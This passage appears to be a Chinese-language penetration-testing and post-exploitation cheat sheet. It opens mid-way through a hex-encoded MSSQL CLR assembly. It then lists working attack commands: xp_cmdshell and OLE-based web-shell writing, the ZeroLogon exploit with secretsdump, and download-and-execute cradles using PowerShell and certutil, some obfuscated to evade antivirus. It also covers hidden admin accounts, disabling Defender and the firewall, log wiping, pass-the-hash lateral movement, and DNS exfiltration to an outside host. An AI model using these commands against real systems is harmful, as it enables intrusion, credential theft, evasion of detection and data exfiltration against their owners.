2E0064006C006C0000002800020001004C006500670061006C0043006F00700079007200690067006800740000002000000044000E0001004F0072006900670069006E0061006C00460069006C0065006E0061006D00650000006D007300730071006C005F0043004C0052002E0064006C006C000000340008000100500072006F006400750063007400560065007200730069006F006E00000030002E0030002E0030002E003000000038000800010041007300730065006D0062006C0079002000560065007200730069006F006E00000030002E0030002E0030002E0030000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000002000000C000000543C00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
  WITH PERMISSION_SET = UNSAFE;
GO
```

创建函数
```
CREATE PROCEDURE [dbo].[ExecCommand]
@cmd NVARCHAR (MAX)
AS EXTERNAL NAME [mssql_CLR].[StoredProcedures].[ExecCommand]
go

```

执行命令，无回显
```
exec dbo.ExecCommand "whoami /all";
```



存储过程写shell无需利用xpcmd
路径
```
D:\\web\\Admin\\script\\scriptsa.aspx
```
访问

```
exec sp_configure 'show advanced options',1;reconfigure;exec sp_configure 'ole automation procedures',1;reconfigure;declare @object int;declare @file int;declare @data varchar(8000);set @data=0x3c25402050616765204c616e67756167653d22432322253e0d0a3c254020496d706f7274204e616d6573706163653;declare @path varchar(4000);set @path=0x443A5C5;exec [master]..[sp_oacreate] 'scripting.fileSystemObject',@object out;exec [master]..[sp_oamethod] @object,'createtextfile',@file output,@path;exec [master]..[sp_oamethod] @file,'write',null,@data;exec [master]..[sp_oamethod] @file,'close',null;
```

另一种写shell，
```
>"D:\\web\\Admin\\script\\sa.aspx" set /p="0x3c25402050616765204c616e67756167653d22432322253e0d0a3c254020496d706f7274204e616d6573706163653d225379737"<nul
```

利用xpcmd写shell
```
EXEC sp_configure 'show advanced options', 1;RECONFIGURE;EXEC sp_configure 'xp_cmdshell', 1;RECONFIGURE;DECLARE @bjxl VARCHAR(8000);SET @bjxl=0x3e22c6e756c;EXEC master..xp_cmdshell @bjxl
```

完整堆叠写shell
```
;exec sp_configure 'show advanced options',1;reconfigure;exec sp_configure 'ole automation procedures',1;reconfigure;declare @object int;declare @file int;declare @data varchar(8000);set @data=0x3c25402056c31222072756e61743d227365727665722220546578743d2222205374796c653d22636f6c6f723a20526564223e3c2f6173703a4c6162656c3e20200d0a3c2f666f726d3e;declare @path varchar(4000);set @path=0x443A5C5737078;exec [master]..[sp_oacreate] 'scripting.fileSystemObject',@object out;exec [master]..[sp_oamethod] @object,'createtextfile',@file output,@path;exec [master]..[sp_oamethod] @file,'write',null,@data;exec [master]..[sp_oamethod] @file,'close',null;----
```

利用xpcmdshell执行命令
```
;EXEC sp_configure 'show advanced options', 1;RECONFIGURE;EXEC sp_configure 'xp_cmdshell', 1;RECONFIGURE;DECLARE @bjxl VARCHAR(8000);SET @bjxl=0x666f72202e2f746573742e747874;EXEC master..xp_cmdshell @bjxl;----
```

## gitlab相关

未登录，可以访问如下url查看公开项目
http:/xxxxx/explore



进入控制台

```
gitlab-rails console production
如果没配置环境变量，cd到安装目录下

/bin/rails console production

如果报错可用
./rails console -e production
```
修改密码
```
通过用户名查找，赋值给user
user = User.where(username:"root").first

修改密码
user.password = "abc123"
user.password_confirmation= "abc123"
user.save!
```
把用户设为admin
```
通过用户名查找，赋值给user
user = User.where(username:"test").first
user.admin=ture
user.save!
```
新增用户参考：https://gist.github.com/tacettin/8182358



## 找可写目录
```

### linux
#### 在/root  war文件的同目录下
写
find /root -name war|while read file;do sh -c "echo $file">$(dirname $file)/finddir.txt;done
删
find /root -name war|while read file;do sh -c "rm $(dirname $file)/finddir.txt";done

#### 在/root  war文件夹下
写
find /root -name war|while read file;do sh -c "echo $file">$file/finddir.txt;done
删
find /root -name war|while read file;do sh -c "rm $file/finddir.txt";done

### windows
for /d %i in (D:\web\*) do whoami > "%i\test.txt"

#### 在C:\Users\liulangmao\Desktop任意子目录  war.txt文件的同目录下
写
for /f %i in ('dir /s /b C:\Users\liulangmao\Desktop\war.txt') do (echo %i > %i\..\finddir.txt)
删
for /f %i in ('dir /s /b C:\Users\liulangmao\Desktop\war.txt') do (del %i\..\finddir.txt)

#### 在C:\Users\liulangmao\Desktop任意子目录  war文件夹下
写
for /f %i in ('dir /s /b C:\Users\liulangmao\Desktop\war') do (echo %i > %i\finddir.txt)
删
for /f %i in ('dir /s /b C:\Users\liulangmao\Desktop\war') do (del %i\finddir.txt)
```
示例：在weblogic靶机/root 所有war文件夹下的finddir.txt文件中写入该war文件夹的路径。
```
find /root -name war|while read file;do sh -c "echo $file">$file/finddir.txt;done

```
 

## hydra

```
参数：
-l 指定的用户名 -L 用户名字典
-p 指定密码 -P 密码字典
-s 指定端口 
-o 输出文件
-t 任务数默认16
-f 爆破成功一个就停止
-v 报错日志详细 -V 攻击日志
>hydra -L /root/user.txt -P pass.txt 10.1.1.10 mysql
>hydra -L /root/user.txt -P pass.txt 10.1.1.10 ssh -s 22 -t 4
>hydra -L /root/user.txt -P pass.txt 10.1.1.10 mssql -vv
>hydra -L /root/user.txt -P pass.txt 10.1.1.10 rdp -V
>hydra -L /root/user.txt -P pass.txt 10.1.1.10 smb -vV
>hydra -L /root/user.txt -P pass.txt ftp://10.1.1.10
```

## medusa

```
参数：
-h 目标名或IP  -H 目标列表
-u 用户名 -U 用户名字典
-p 密码 -P 密码字典 -f 爆破成功停止 -M 指定服务 -t 线程
-n 指定端口 -e ns 尝试空密码和用户名密码相同
>medusa -h ip -u sa -P /pass.txt -t 5 -f -M mssql
>medusa -h ip -U /root/user.txt -P /pass.txt -t 5 -f -M mssql
```

## python开启交互shell

py3

```
python3 -c "import pty;pty.spawn('/bin/bash')"
```

py2
```
python2 -c 'import pty;pty.spawn("/bin/sh")'

python -c 'import pty;pty.spawn("/bin/bash")'
```
用完记得清记录
```
history -c
```


## windows添加用户

bypass
https://github.com/lengjibo/NetUser
https://github.com/crisprss/BypassUserAdd

正常添加
```
net user admin$ Afabab@20 /add
net localgroup administrators admin$ /add

net user guest /active:yes
net localgroup administrators guest /add

Net localgroup Administrators kent /add /domain 将域用户添加到域管理员组

Net localgroup Administrators /add test\kent 将域用户添加到本地管理员组
```

## 防火墙操作
```
关闭防火墙

netsh firewall set opmode mode=disable

放行远程8888端口进来的流量
netsh advfirewall firewall add rule name="88" protocol=TCP dir=in remoteport=8888 action=allow

放行出去到远程8888端口的流量
netsh advfirewall firewall add rule name="88" protocol=TCP dir=out remoteport=8888 action=allow

放行本地4444端口出去的流量
netsh advfirewall firewall add rule name="44" protocol=TCP dir=out localport=4444 action=allow

放行从本地4444端口进来的流量
netsh advfirewall firewall add rule name="44" protocol=TCP dir=in localport=4444 action=allow

删除规则
netsh advfirewall firewall delete rule name="88"

查看防火墙配置(可看到具体规则等配置)
netsh firewall show config

关闭windefebd
net stop windefend

netsh firewall set portopening TCP 445 ENABLE //打开445端口    
netsh firewall set portopening TCP 3389 ENABLE //开放终端  
netsh firewall delete allowedprogram C:/A.exe //删除放行程序A.exe   
netsh firewall set allowedprogram C:/A.exe test ENABLE //添加程序C盘下的A.exe并放行   
netsh firewall add allowedprogram C:/A.exe test ENABLE //添加程序C盘下的A.exe并放行   

新版本命令   

netsh advfirewall firewall add rule name="test" dir=in action=allow program="C:\windows\temp\update.exe" enable=yes   
netsh advfirewall firewall add rule name="test" dir=out action=allow program="C:\windows\temp\update.exe" enable=yes   

```
端口转发   
把本地的 801 端口转发到远程的 172.23.80.14 的 80 端口
```
netsh interface portproxy add v4tov4 listenport=801 connectport=80 connectaddress=172.23.80.14
```

iptables 放行  
```
iptables -A INPUT -p tcp --dport 80 -j ACCEPT

```

## frp常用配置
frpc.ini
```
[common]
server_addr = xxxxxx
server_port = 7000

[rdp]
type = tcp
local_port = 3389
remote_port = 3389

[plugin_http_proxy]
type = tcp
remote_port = 10801
plugin = http_proxy

[plugin_socks5]
type = tcp
remote_port = 1080
plugin = socks5

```

## ZeroLogon

- 产生日志 4742(利用成功), 5580(利用失败) 
- 流量特征明显
- 会被av直接秒
- 有可能会导致目标脱域
- 代理不稳，容易出问题（要发很多个包去试）



```
 git clone https://github.com/mstxq17/cve-2020-1472.git
 
 python3 zerologon_tester.py Dc02 172.23.119.120 域外检测
 
 PingCastle.exe --server 172.23.119.120 --scanner zerologon --scmode-dc 域内检测
 
```

洞清空目标域控机器账户密码
```
python3 cve-2020-1472-exploit.py Dc02$ 172.23.119.120

```
无密码远程提取 ntds.dit
```
python3 secretsdump.py qq.local/'Dc02$'@172.23.119.120 -no-pass -outputfile qq.local.ntds.hash
```

用 administrator 域管账户 hash 远程导出域控机器账户 hash [hex 格式]
```
python3 secretsdump.py -hashes :ccef208c6485269c20db2cad21734fe7 qq/administrator@172.23.119.120
```
用上面的 hex 还原目标域控机器账户密码
```
python3 restorepassword.py Dc02@Dc02 -target-ip 172.23.119.120 -hexpass daf1d2acc25d2e54218921737a40d58192b9bcdf089ddbeaf9f7931571b07916f96e2c51d8d00f56d2440c13c0e5586e2dafd1669e37131***

```



## 删rdp日志

清除远程桌面连接记录,创建clear.bat

```
@echo off
reg delete "HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Default" /va /f
reg delete "HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Servers" /f
reg add "HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Servers"
cd %userprofile%\documents\attrib Default.rdp -s -h
del Default.rdp
```

## 删web日志
```
/var/log/nginx/  
​  
access.log
error.log  
​  
tomcat 位于 logs  
catalina.*.log
access_log.*.txt  

```

linux 系统日志
```
#!/usr/bin/bash
echo > /var/log/syslog
echo > /var/log/messages
echo > /var/log/httpd/access_log
echo > /var/log/httpd/error_log
echo > /var/log/xferlog
echo > /var/log/secure
echo > /var/log/auth.log
echo > /var/log/user.log
echo > /var/log/wtmp
echo > /var/log/lastlog
echo > /var/log/btmp
echo > /var/run/utmp
rm ~/./bash_history
history -c
```
windows iis日志
```
C:\inetpub\logs\LogFiles
```


## 开3389
开Rdp
```
方法一
wmic /namespace:\root\cimv2\terminalservices path win32_terminalservicesetting where (__CLASS != "") call setallowtsconnections 1
wmic /namespace:\root\cimv2\terminalservices path win32_tsgeneralsetting where (TerminalName ='RDP-Tcp') call setuserauthenticationrequired 1
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fSingleSessionPerUser /t REG_DWORD /d 0 /f
net start TermService

方法二
#设置远程桌面端口
reg add "HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /t REG_DWORD /v portnumber /d 3389 /f
#开启远程桌面
wmic RDTOGGLE WHERE ServerName='%COMPUTERNAME%' call SetAllowTSConnections 1
#检查端口状态
netstat -an|find "3389"
#关闭远程桌面
wmic RDTOGGLE WHERE ServerName='%COMPUTERNAME%' call SetAllowTSConnections 0
```


## windows短文件名
短文件名查看
```
用"dir /x"命令可以方便地帮助您查看系统对目录或文件名的缩写
```
常见短文件名
```

Documents and Settings
可表示为
DOCUME~1
又如：
Local Settings
可表示为
LOCALS~1

Program Files
Program Files (x86)
这两个目录分别表示为：
PROGRA~1
PROGRA~2
```

## powershell无文件落地执行
powershell不落地文件执行
```
powershell -c "Invoke-Expression (New-Object Net.WebClient).DownloadString("http://xxx.xx.xx.xx/test.ps1")"

powershell -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://baidu.com/test.ps1'))"

powershell -ExecutionPolicy Bypass -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://baidu.com/test.ps1'))"

echo IEX(New-Object Net.WebClient).DownloadString("http://10.10.14.13:8000/rev.ps1") | powershell -noprofile
```

## Defender排除项

Defender添加排除项，加白。
```
powershell -ExecutionPolicy Bypass Add-MpPreference -ExclusionPath "C:\users"

查询排除项
powershell -ExecutionPolicy Bypass (Get-MpPreference).ExclusionPath
```


## powershell文件下载

```
powershell (new-object System.Net.WebClient).DownloadFile('http://192.168.1.1/1.exe','C:\test\1.exe');start-process 'C:\test\1.exe'
```
常用
```
powershell (new-object System.Net.WebClient).DownloadFile('http://192.168.1.1/1.exe','1.exe')
```

bypass下载

```
echo (new-object System.Net.WebClient).DownloadFile('http://192.168.31.93:8000/tomcat.exe','C:/Users/test/cc.exe')| powershell -
```

## powershell执行脚本
base64编码(和其他base64不同，解不开)
```
$Text = "(new-object System.Net.WebClient).DownloadFile('http://xxxxxxxxxx:8000/bddch.txt','bdchd.txt')"
$Bytes = [System.Text.Encoding]::Unicode.GetBytes($Text)
$EncodedText =[Convert]::ToBase64String($Bytes)
$EncodedText
```
快速生成,每条命令用;隔开
```
//加密echo 1
powershell -Command "$Text = 'echo 1'; $Bytes = [System.Text.Encoding]::Unicode.GetBytes($Text); $EncodedText = [Convert]::ToBase64String($Bytes); $EncodedText"
```


base64解码
```
$EncodedText = "dwByAGkAxxxxxxxxxxxxxxxxxxxAG0AbgB0AG4AJwA="
$DecodedText = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($EncodedText))
$DecodedText

```


运行上面base64编码后的命令，编码后的命令，执行火绒会拦截。
```
powershell -ExecutionPolicy Bypass -nop -w hidden -sta -enc ZQBjAGgAbwAgADEA
```

不编码执行
```
powershell -noP -sta -Command "echo 1"

下面路径必须用/
powershell -noP -sta -Command "echo '1'>d:/21fsd.txt"

绕过执行
echo|echo|@powershell -c "1>d:/21fsd.txt"|whoami

绕过
echo|echo|@powershell -ExecutionPolicy Bypass -c "1>d:/aaaaaaaa.txt"|whoami

绕过执行策略
powershell -ExecutionPolicy Bypass -noP -sta -Command "echo '1'>d:/211fsd.txt"
```
powershell bypass文章
https://www.netspi.com/blog/technical-blog/network-pentesting/15-ways-to-bypass-the-powershell-execution-policy/



## certutil.exe下载

```
C:\Windows\System32\certutil.exe C:\Users\Public\cer.exe
```

```
certutil.exe -urlcache -split -f http://192.168.1.1/1.exe
```

```
certutil.exe -urlcache -split -f http://192.168.1.1/1.txt 1.exe
```

```
certutil.exe -urlcache -split -f http://192.168.6.27:8012/download/f.ext C:\windows\temp\up.exe &&start C:\windows\temp\up.exe
```

删除缓存

```
certutil.exe -urlcache -split -f http://192.168.1.1/1.exe delete
```

查看缓存项目：

```
certutil.exe -urlcache *
```

转为base64

```
certutil -encode lcx64.exe lcx64.txt
```

转回来

```
certutil -decode lcx64.txt lcx64.exe
```

查看md5

```
certutil -hashfile a.exe MD5
```

bypass

```
Certutil & Certutil –urlcache –f –split url
Certutil | Certutil –urlcache –f –split url
```

利用windows的特性，通过" ；@等等符号组合的方式进行混淆执行，发现也能检测到异常行为并拦截。
```
;,@certutil&&;,@certutil  -u""r""l""c""a""c""h""e"" -split  -f http://192.168.xx.xx:7000/test.txt

;,@certutil  -u""r""l""c""a""c""h""e"" -split -f http://192.168.xx.xx:7000/a.exe -DeleteHelloContainer

cer^t^u^til -url""""cache -a -sp""""lit -f  http://192.168.xx.xx:8080/xx.txt

certutil -url""""cache -split -f http://192.168.xx.xx:7070/test.txt
cert^u^t^il -url""""cache -sp""""lit -f http://192.168.xx.xx:7070/test.txt
```


换路径
```
copy c:\windows\system32\certutil.exe a.exe
a.exe -urlcache -split -f  http://192.168.xx.xx:7000/gdut.txt
```


## rdp拉起马儿

RDP桌面下，隐藏窗口启动
```
后台运行
powershell -Command "Start-Process 'agent.exe' -WindowStyle Hidden"

带参数
powershell -Command "Start-Process 'agent.exe' -ArgumentList 'xxx' -WindowStyle Hidden"

更隐蔽可以把exe后缀也改了，也能正常运行。不过没什么卵用
powershell -Command "Start-Process 'agent.xxx' -WindowStyle Hidden"
```


## bitsadmin

**不支持https、ftp协议，php python带的服务器会出错**

```
bitsadmin /transfer n http://192.168.1.1/1.exe  C:\test\update\1.exe
```

## wget 下载文件
下载到指定目录
```
wget -P /tmp http://127.0.0.1:8088/aliyun
```

## curl 下载
使用内置option：-o(小写)
```
curl -o dodo1.jpg http:www.linux.com/dodo1.JPG

可以跳目录
curl -o ../../www/dodo1.jpg http:www.linux.com/dodo1.JPG
```
使用内置option：-O（大写)
```
curl -O http://www.linux.com/dodo1.JPG
```

下载后，上线
```
chmod +x /tmp/aliyun&&/tmp/aliyun
```


## windows信息收集常用命令
```
Systeminfo 计算机详细信息(补丁信息)

Net start 所启动的服务

Wmic service list brief 查询本机服务信息

Tasklist 进程列表

Wmic startup get command,caption 查看启动该程序信息

Schtasks /query /fo LIST /v计划任务

Netstat -ano 根据本机端口开放情况来判断有什么服务、其角色

Query user || qwinsta 查看当前在线用户

Net session 列出会话

Net share 查看本机的共享列表

Wmic share get name,path,status 查看共享列表

Net user 本地用户

Net user kkkk 查看本地用户信息


Net localgroup 本地用户组

Net localgroup /domain 域用户组

Net localgroup adminnstrators 本地管理员组成员

net localgroup adminstrators /domain 查看登陆过主机的管理员

Wmic useraccount get /all 获取域内用户详细信息

dsquery user 查看存在的用户

Net user /domain 域用户信息

Net user kkkk /domain 域用户kkkk信息

Net user kent password /add /domain添加域用户


Net group /domain 域用户组信息

Net view /domain 查询域

Net view /domain:test 查询域内计算机

Net accounts /domain 查询域中密码策略

Net group /domain 查看域内所有用户组

Net group "Domain Controllers" /domain 查看域控制器组

Net group "Domain computers" /domain 查看域内所有计算机列表

Net group "Domain admins" /domain 查看域内管理员用户

Net user /domain kent active:yes 启用域账户

Net user /domain kent active:no 禁用域账户

Nltest /DCLIST:test 查看域中域控制器名

Wmic useraccount get /all 用户详细信息

Net group "Domain Admins" /domain 对应组下的账户信息

nltest /domain_trusts 获取域信任信息

net config workstation 了解本机的配置信息

Netsh firewall show config 查看防火墙配置

Netsh advfirewall set allprofiles state off关闭防火墙(windows server 2003后)

Netsh advfirewall firewall add rule name="pass nc" dir=in action=allow program="C:\nc.exe" 允许指定程序进入(windows server 2003后)

Netsh advfirewall firewall add rule name="allow nc" dir=out action=allow program="C:\nc.exe"允许指定程序退出(windows server 2003后)

Netsh advfirewall firewall add rule name="Remote Desktop" protocol=TCP dir=in localport=3389 action=allow 允许3389连接(windows server 2003后)

Reg query "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Internet Settings"查看端口代理配置信息

Reg query "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /V PortNumber 查看远程桌面端口号

```

## linux信息收集常用命令

```
uname -a 所有版本
cat /etc/issus 判断系统
cat /etc/passwd 查看系统用户

查看ip
ifconfig
ip addr

路由表
route -e

判断docker
ls -al /.dockerenv

定时任务
/etc/crontab

查看网络和外连
netstat -ano

查看进程
ps -ef
```



## ping存活主机扫描
```
for /L %I in (1,1,256) DO @ping -w 1 -l 1 192.168.202.%I | findstr "TTL="
```




## at&schtasks&sc横向

pth和ptt使用


使用明文密码登录到目标，需要445和139端口开启：
```
net use \\192.168.2.148\ipc$ password /user:test\administrator

net use \\192.168.2.148\ipc$ password /user:administrator

复制文件
copy c:\1.exe \\192.168.2.148\c$

at新建10:10分运行的定时作业
at \\192.168.2.148 10:10 c:\1.exe

Windows server 2012及以上使用schtasks命令
Schtasks /create /s 192.168.2.148 /ru “SYSTEM” /tn executefile /sc DAILY /tr c:/1.exe /F
Schtasks /run /s 192.168.2.148 /tn executefile /i
Schtasks /delete /s 192.168.2.148 /tn executefile /f

sc \\192.168.210.107 create hacker binpath="c:\shell1.exe"   #创建服务
sc \\192.168.210.107 start hacker      #启动hacker服务
```

## impacket包横向命令

内网横向移动工具

优先，wmi或者dcom。psexec直接不要用。

| **工具**       | **核心依赖**   | **防火墙友好度** | **隐蔽性 (免杀)** | **日志留存 (特征)**       |
| ------------ | ---------- | ---------- | ------------ | ------------------- |
| **Smbexec**  | 445 (SMB)  | ⭐⭐⭐⭐⭐      | ⭐⭐           | **极高** (大量服务日志)     |
| **Atexec**   | 445 (RPC)  | ⭐⭐⭐        | ⭐⭐⭐          | **中** (计划任务日志)      |
| **Wmiexec**  | 135 + 动态端口 | ⭐⭐         | ⭐⭐⭐⭐         | **低** (WmiPrvSE子进程) |
| **Dcomexec** | 135 + 动态端口 | ⭐⭐         | ⭐⭐⭐⭐⭐        | **极低** (合法进程调用)     |

445为smb端口   
135为rpc端口，可以用dcom和wmi  

exe版本
https://github.com/maaaaz/impacket-examples-windows     
https://github.com/ropnop/impacket_static_binaries/releases   
python版本
https://github.com/fortra/impacket

必备工具
```
sudo yum install proxychains-ng
sudo apt install proxychains4
sudo apt install proxychains

配置
vim /etc/proxychains.conf
```

测试代理
```
curl -x http://127.0.0.1:1080 -v cip.cc
```

Atexec
```
需要445端口开启
Atexec.exe hacker/administrator:abc123@192.168.202.148 "whoami"

Atexec.exe -hashes :fac5d668099409cb6fa223a32ea493b6 hacker/administrator@192.168.202.148 "whoami"
```


dcomexec
```
需要135端口开启
dcomexec.exe hacker/administrator:abc123@192.168.202.148 "whoami"

dcomexec.exe -hashes :fac5d668099409cb6fa223a32ea493b6 hacker/administrator@192.168.202.148 "whoami"
```

psexec（不推荐）
```
官方Psexec第一种利用方法：可以先有ipc链接，再用psexec运行相应的程序：
Net use \192.168.202.148\ipc$ zxcvbnm123 /user:test\Administrator
Psexec \192.168.202.148 -accepteula -s cmd

官方Psexec第二种利用方法：不用建立ipc连接，直接使用密码或hash进行传递
Psexec \192.168.202.148 -u Administrator -p zxcvbnm123 -s cmd

PsExec -hashes :fac5d668099409cb6fa223a32ea493b6 test.com/Administrator@192.168.202.148 "whoami" (官方提供的exe执行不了)
```

smbexec
```
需要445端口开启
Smbexec test/Administrator:zxcvbnm123@192.168.202.148
Smbexec -hashes :fac5d668099409cb6fa223a32ea493b6 test/Administrator@192.168.202.148
```

wmi(推荐)
```
WMI利用135端口，支持明文和hash两种方式进行身份验证，且系统日志不记录。
第一种：使用系统自带的WMIC明文传递执行相应命令，但执行的结果不回显（先管理员账户登录）
Wmic /node:192.168.202.148 /user:Administrator /password:zxcvbnm123 process call create "cmd.exe /c ipconfig >C:/1.txt"

第二种：使用系统自带cscript明文传递执行反弹shell，执行结果有回显，现已被杀
Cscript //nologo wmiexec.vbs /shell 192.168.202.148 Administrator zxcvbnm123

第三种：使用第三方impacket套件中的Wmiexec进行明文或hash传递，执行结果有回显
Wmiexec test/Administrator:zxcvbnm123@192.168.202.148 "whoami"
Wmiexec -hashes :fac5d668099409cb6fa223a32ea493b6 test/Administrator@192.168.202.148 "whoami"


wmiexec -hashes 00000000000000000000000000000000:ccef208c6485269c20db2cad21734fe7 workgroup/administrator@192.168.3.21 "whoami"

python wmiexec -hashes 00000000000000000000000000000:3617ad523f47fc96f24c45943affd954 administrator@192.168.1.131 

批量
FOR /F %i in (ips.txt) do wmiexec -hashes 00000000000000000000000000000:a194552f8dd6d260d61dd99262264530 workgroup/admin@%i "whoami"

FOR /F %i in (ips.txt) do wmiexec -hashes 00000000000000000000000000000:fac5d668099409cb6fa223a32ea493b6 admin@%i "whoami"

FOR /F %i in (ips.txt) do wmiexec -hashes :a194552f8dd6d260d61dd99262264530 admin@%i "whoami"
```

批量操作,需要保存为bat执行
```
用已知密码和用户，批量连接ip:
FOR /F %i in (ips.txt) do net use \%i\ipc$ "password" /user:hacker\administrator

已知用户和ip，批量连接密码(爆破密码)：
FOR /F %i in (pass.txt) do net use \192.168.202.148\ipc$ "%i" /user:test\administrator

已知用户和ip，批量连接hash(爆破hash)：
FOR /F %i in (hash.txt) do Wmiexec.exe -hashes :"%i" test/administrator@192.168.202.148 "whoami"

FOR /F %i in (ips.txt) do Wmiexec -hashes :fac5d668099409cb6fa223a32ea493b6 test/Administrator@%i "whoami"


```
精准批量法
```
shell for /l %i in (1,1,253) do echo 172.22.13.%i >>tip.txt
shell for /f %i in (tip.txt) do ping -n 1 -w 10 %i | find /i "ttl" >nul && echo %i >>ok.tx
shell for /f %i in (ok.txt) do dir \\%i\c$\users >>result.txt
```


## cme&&netexec

cme 批量
```
proxychains4 ./cme smb 10.0.0.1/24 -u administrator -H 31d6cfe0d16ae931b73c59d7e0c089c0 -d xx.org -x "net user"
```

单独执行命令
```
crackmapexec smb 192.168.10.11 -u Administrator -p 'P@ssw0rd' -x whoami
```
ldap喷洒
```
cme ldap 10.11.12.211 -u 'username' -p 'password' --kdcHost 10.11.12.211 --users
```


cme停止维护，替代品为netexec  
https://github.com/Pennyw0rth/NetExec

干净的linux环境
```
# 安装编译需要的工具
yum groupinstall "Development Tools"
yum install zlib-devel bzip2-devel openssl-devel ncurses-devel \
sqlite-devel readline-devel tk-devel \
xz-devel python3-devel libffi-devel

# 安装 pyenv
curl https://pyenv.run | bash

# 添加到 shell 配置文件
echo 'export PATH="$HOME/.pyenv/bin:$PATH"' >> ~/.bashrc
echo 'eval "$(pyenv init -)"' >> ~/.bashrc
echo 'eval "$(pyenv virtualenv-init -)"' >> ~/.bashrc
source ~/.bashrc

pyenv install 3.10.0
pyenv global 3.10.0

python -m pip install --upgrade pip

pyenv是下载Python源码到本地编译，容易编译失败。用conda替代

wget https://repo.anaconda.com/miniconda/Miniconda3-latest-Linux-x86_64.sh
wget https://repo.anaconda.com/miniconda/Miniconda3-latest-Linux-aarch64.sh

bash Miniconda3-latest-Linux-x86_64.sh

source ~/.bashrc

conda create -n nxc python=3.10
conda activate nxc

```

安装
```

python -m pip install --user pipx
python -m pipx ensurepath
python -m pipx install git+https://github.com/Pennyw0rth/NetExec

安装失败就直接用pip
python -m pip install --upgrade pip
python -m pip install --user git+https://github.com/Pennyw0rth/NetExec
```

使用和cme几乎一样
https://www.netexec.wiki/

```
nxc <protocol> <target(s)> -u username -p password
nxc <protocol> <IP> -d <DOMAIN> -u Administrator -p 'password'
```

信息收集使用，收集版本信息。
记得编辑/etc/proxychains.conf 把quiet_mode，打开。不然数据太乱
```
ssh信息
proxychains nxc ssh 192.168.0.1/24

smb收集主机信息
proxychains nxc smb 192.168.0.1/24
```


exp使用
```


nxc smb 192.168.1.50 -u 'admin' -p 'pass' -x 'whoami'

nxc smb 192.168.1.50 -u Administrator -H 'aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0' -x 'whoami'


nxc smb 192.168.1.50 -d test -u Administrator -H 'aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0' -x 'whoami'

批量
nxc smb ips.txt -u admin -H '00000000000000000000000000000000:31d6cfe0d16ae931b73c59d7e0c089c0' -x 'whoami'


执行的结果，包含Pwn3d! 表示有戏

包含guest，表示smb能匿名访问

```


默认wmi，可加--exec-method 尝试别的
```
nxc has three different command execution methods:

- `wmiexec` executes commands via WMI
- `atexec` executes commands by scheduling a task with windows task scheduler
- `smbexec` executes commands by creating and running a service

By default nxc will fail over to a different execution method if one fails. It attempts to execute commands in the following order:

1. `wmiexec`
2. `atexec`
3. `smbexec`

If you want to force nxc to use only one execution method you can specify which one using the `--exec-method` flag.
```




## 命令执行无回显外带oob
#### Windows
在windows当中，%cd% 代表的是当前目录，我们通过echo将当前目录写入文本temp,然后荣国certutil对文件内容进行base64编码，再过滤certutil携带的字符，将它赋给一个变量，最后通过nslookup外带出来，从而实现获取当前目录的目的。
```
echo %cd% > temp&&certutil -encode temp temp1&&findstr /L /V "CERTIFICATE" temp1 > temp2&&set /p ADDR=<temp2&&nslookup %ADDR%.is1lv6.ceye.io
```
下面这个语句，主要是过滤作用。把helo.txt文件中的“=”过滤并重新输出文件。
```
for /f "delims=^= tokens=1,*" %i in (helo.txt) do (echo %i>>text3.txt)
```
为什么在上面需要过滤=，主要是因为在执行ping命令的时候是不允许带=号的，相较于nslookup，ping命令成功率相对较高，但如果路径过长，可能会导致失败。具体多长需要大家自行试验。
```
echo %cd% > temp&&certutil -encode temp temp1&&findstr /L /V "CERTIFICATE" temp1 > temp2&&for /f "delims=^= tokens=1,*" %i in (temp2) do (echo %i>>temp3)&&set /p ADDR=<temp3&ping %ADDR%.is1lv6.ceye.io
```
如果需要外带多行命令，则需要以下语句：
```
where /R C: login.* > test && certutil -encodehex -f test test.hex 4 && powershell $text=Get-Content test.hex;$sub=$text -replace(' ','');$j=11111;foreach($i in $sub){ $fin=$j.tostring()+'.'+$i+'.is1lv6.ceye.io';$j += 1; nslookup $fin }
```
win常用变量
```
//变量                     类型       描述
//%ALLUSERSPROFILE%        本地       返回“所有用户”配置文件的位置。
//%APPDATA%                本地       返回默认情况下应用程序存储数据的位置。
//%CD%                     本地       返回当前目录字符串。
//%CMDCMDLINE%             本地       返回用来启动当前的 Cmd.exe 的准确命令行。
//%CMDEXTVERSION%          系统       返回当前的“命令处理程序扩展”的版本号。
//%COMPUTERNAME%           系统       返回计算机的名称。
//%COMSPEC%                系统       返回命令行解释器可执行程序的准确路径。
//%DATE%                   系统       返回当前日期。使用与 date /t 命令相同的格式。由 Cmd.exe 生成。有关 date 命令的详细信息，请参阅 Date。
//%ERRORLEVEL%             系统       返回上一条命令的错误代码。通常用非零值表示错误。
